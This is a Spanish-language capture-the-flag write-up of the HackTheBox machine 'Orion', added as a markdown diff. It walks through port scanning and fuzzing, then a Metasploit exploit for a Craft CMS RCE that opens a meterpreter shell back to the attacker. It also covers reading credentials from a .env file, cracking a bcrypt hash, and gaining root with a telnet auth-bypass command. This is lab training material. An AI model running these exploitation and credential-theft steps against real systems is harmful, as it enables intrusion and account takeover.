@@ -1,0 +1,164 @@
+---
+title: "Writeup Orion"
+description: "Writeup de la máquina Orion de HackTheBox"
+date: "2026-07-22"
+tags: ["HackTheBox", "hacking", "metasploit"]
+---
+
+## ¿Qué encontrarás aqui?
+
+- Usaremos metasploit para lograr la intrusión
+- Veremos un RCE
+- Escalaremos privilegios
+- Usaremos una base de datos
+
+## Tecnologías
+
+- Nmap
+- Metasploit
+- Ffuzz
+- MariaDB
+
+## Escaneo de puertos
+
+Comenzamos la máquina con un escaneo de puertos y de versiones con Nmap:
+
+` sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.129.244.146 -oN orion.txt` 
+
+Vemos que tenemos el puerto 80 abierto y el 22 y, en el primero, Nmap, nos detecta un dominio.
+
+[![nmap_orion](/nmap_orion.png)](/nmap_orion.png)
+
+Añadimos dicho dominio a nuestro `/etc/hosts` .
+
+[![nano_orion](/nano_orion.png)](/nano_orion.png)
+
+## Fuzzing
+
+Ahora podemos visualizar la web, pero no econtramos anda relevante ni siquiera en el código, así que vamos a hacer fuzzing. 
+
+[![front_orion](/front_orion.png)](/front_orion.png)
+
+`ffuf -u http://orion.htb/FUZZ \-w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 162` 
+
+[![web_orion](/web_orion.png)](/web_orion.png)
+
+Vemos que hay varias rutas y subdirectorios, entre ellos admin, así que lo visitamos y vemos un panel de login donde vemos una instancia de Craft y su versión, que si hacemos una investigación vemos que tiene una vulnerabilidad RCE. Su CVE es: CVE-2025-32432.
+
+## Intrusión
+
+Una vez sabemos el CVE podemos buscar en metasploit a ver si tiene algún exploit.
+
+`search CVE-2025-32432` 
+
+Vemos que existe, así que vamos a configurarlo de para su uso.
+
+[![exploit_orion](/exploit_orion.png)](/exploit_orion.png)
+
+```
+show options
+set RHOST url_panel_login (http://orion.htb/admin/login)
+set LHOST ipatacante 
+```
+Una vez configurado, lo ejecutamos con el comando `run` y vemos que ganamos una sesión de meterpreter.
+
+[![meterpreter_orion](/meterpreter_orion.png)](/meterpreter_orion.png)
+
+Ahora con el comando `getuid` comprobamos que somos el usuario www-data, así que vamos a escalar privilegios.
+
+Lo primero es estabilizar la terminal siguiendo esta secuencia:  `shell` `script /dev/null -c /bin/bash` `export TERM=xterm` `export SHELL=bash`.
+
+El siguiente paso lógico es hacer un `ls -la` para ver cositas y nos vamos al home, vemos que hay un usuario llamado adam.
+
+[![adam_orion](/adam_orion.png)](/adam_orion.png)
+
+## Escalada de privilegios
+
+Investigamos la estructura de directorios y archivos de Craft, sabemos que hay un archivo `.env` así que lo buscamos y lo leemos ` cat .env` .
+
+`find /var/www/ -name ".env"` 
+
+Y vemos que la ruta exacta es: `/var/www/html/craft/.env` 
+
+`cat /var/www/html/craft/.env`
+
+Vemos las credenciales de una base de datos.
+
+[![credenciales_orion](/credenciales_orion.png)](/credenciales_orion.png)
+
+Nos conectamos a la base de datos con las credenciales encontradas y vemos que son válidas.
+
+`mysql -u root -p orion`
+
+Una vez conectados, vamos a ver las tablas que contiene:
+
+`show tables` 
+
+Vemos que entre muchas otras, hay una llamada users.
+
+[![users_orion](/users_orion.png)](/users_orion.png)
+
+Ahora intentamos ver su contenido con `select id, username, email, password from users;`  y vemos el password del usuario adam.
+
+[![cifrado_orion](/cifrado_orion.png)](/cifrado_orion.png)
+
+Lo pegamos en cualquier IA para ver de qué tipo es y como podemos romperlo.
+
+Nos dice que es de tipo bcrypt así que lo copiamos y lo metemos en un `.txt`  para crackearlo.
+
+Con Hashcat, podemos averiguar la password:
+
+`hashcat -m 3200 password.txt rockyou.txt` 
+
+Y vemos que la pass es `darkangel`, así que nos conectamos por SSH al como el usuario adam.
+
+[![darkangel_orion](/darkangel_orion.png)](/darkangel_orion.png)
+
+`ssh adam@orion.htb` 
+
+[![ssh_orion](/ssh_orion.png)](/ssh_orion.png)
+
+Una vez conectados, leemos la flag de usuario.
+
+Ahora hacemos una enumeración básica con `ss -tulnp` y vemos que el puerto 23 está abierto que corresponde a telnet, así que intentamos conectarnos.
+
+`telnet 127.0.0.1`
+
+Y usamos las credenciales de adam.
+
+Ahora miramos la versión de telnet con: `telnet --version` 
+
+[![version_orion](/version_orion.png)](/version_orion.png)
+
+Es conocido que GNU Inetutils telnet 2.7 tiene un CVE-2026-24061 que investigando un poco por internet, sabremos explotar.
+ 
+Según la definición de Deepseek, permite un bypass de autenticación manipulando la variable de entorno USER con el siguiente comando:
+
+`USER="-f root" telnet -a 127.0.0.1` 
+
+Y ya somos root.
+
+[![root_orion](/root_orion.png)](/root_orion.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
